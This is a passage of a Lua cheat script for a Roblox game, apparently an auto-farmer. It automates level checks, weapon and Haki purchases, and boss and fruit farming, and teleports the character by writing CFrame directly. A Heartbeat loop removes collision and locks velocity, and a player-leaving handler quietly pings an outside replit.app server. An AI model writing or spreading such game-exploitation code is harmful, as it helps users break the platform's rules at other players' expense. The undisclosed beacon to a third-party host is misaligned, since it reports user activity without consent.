            task.wait(60) -- Check every 60 seconds
            continue
        end

        -- ===== PRIORITY 0: Check Artifacts at Level 4000 =====
        if level >= 4000 then
            if not checkArtifactsUnlocked() then
                local unlocked = unlockArtifacts()
                if unlocked then
                    equipArtifacts()
                end
            end
        end

        -- ===== PRIORITY 0.5: Check Observation Haki at Level 6000 =====
        if level >= 6000 then
            if not checkHasObservationHaki() then
                buyObservationHaki()
            end
        end

        -- ===== PRIORITY 0.6: Check Saber Boss Farm (independent from Ichigo) =====
        if _G.Config.FarmSaberBoss then
            -- Check if at least 1 Boss Key exists
            local bossKeyCount = checkBossKeyCount()
            if bossKeyCount >= 1 then
                farmSaberBoss()
                task.wait(5)
            end
        end

        -- ===== PRIORITY 0.7: Check Ichigo Exchange =====
        if _G.Config.ExchangeIchigo and level >= _G.Config.IchigoMinLevel then
            if not checkDarkBlade("Ichigo") then
                local hasAll, missing = checkIchigoRequirements()
                
                if hasAll then
                    exchangeIchigo()
                end
            end
        end

        -- ===== PRIORITY 1: Check Dark Blade before everything =====
        local hasBlade = findDarkBladeInHand() ~= nil
        if not hasBlade then
            hasBlade = equipDarkBladeFromInventory()
        end

        if hasBlade then
            
            -- If Dark Blade exists + Level >= FruitMinLevel → check Fruit Farm
            if _G.Config.FruitFarm and level >= _G.Config.FruitMinLevel then
                
                local hasFruit = checkHasFruit(_G.Config.TargetFruit)
                if hasFruit then
                    isFruitFarming = true
                    equipFruit(_G.Config.TargetFruit)
                    
                    -- Teleport to fruit farm position
                    local island = _G.Config.FruitFarmIsland
                    local pos = _G.Config.FruitFarmPos
                    pcall(function() tpRemote:FireServer(island) end)
                    task.wait(3)
                    
                    local char = player.Character
                    if char and char:FindFirstChild("HumanoidRootPart") then
                        for i = 1, 10 do
                            char.HumanoidRootPart.CFrame = pos
                            task.wait(0.1)
                        end
                    end
                    
                    task.spawn(fruitFarmLoop)
                    break
                else
                    oldPrint("[DEBUG] About to call startFruitFarm...")
                    local ok, err = pcall(startFruitFarm)
                    if ok then
                        oldPrint("[DEBUG] startFruitFarm completed OK")
                    else
                        oldPrint("[DEBUG] startFruitFarm ERROR:", tostring(err))
                    end
                    break
                end
            else
                -- If Dark Blade exists but not >= FruitMinLevel → normal farm
                break
            end
        end

        -- STEP 2: No Dark Blade → check Haki
        local hasHaki = checkHakiStatus()

        if hasHaki then
            -- STEP 3: Has Haki but no Dark Blade → buy Dark Blade
            if _G.Config.BuyDarkBlade then
                pcall(buyDarkBlade)
            end
            break
        end

        -- STEP 4: No Haki + No Dark Blade → start Haki Quest
        if _G.Config.HakiQuest and not isHakiQuestActive then
            isHakiQuestActive = true
            pcall(startHakiQuest)
            -- After Haki Quest (Dark Blade bought in farmThiefForHaki)
            isHakiQuestActive = false
            break
        end

        task.wait(60) -- Check every 60 seconds
    end
end)

-- Normal Farm
task.spawn(function()
    task.wait(15)
    pcall(farmLoop)
end)

-- [13] EVENT HANDLERS
player.OnTeleport:Connect(function(state)
    if state == Enum.TeleportState.Failed then
        task.wait(1.5)
        pcall(rejoin)
    end
end)

Players.PlayerRemoving:Connect(function()
    pcall(function()
        game:HttpGet("https://node-api--0890939481gg.replit.app/leave")
    end)
end)

-- [14] HEARTBEAT PHYSICS LOCK (v3)
task.spawn(function()
    RunService.Heartbeat:Connect(function()
        if player.Character then
            -- Lock only velocity (not Anchored/PlatformStand) to allow receiving/dealing damage
            for _, v in pairs(player.Character:GetChildren()) do
                if v:IsA("BasePart") and v.Name ~= "HumanoidRootPart" then
                    v.CanCollide = false
                    v.AssemblyLinearVelocity = Vector3.zero
                    v.AssemblyAngularVelocity = Vector3.zero
                end
            end
        end
    end)
end)
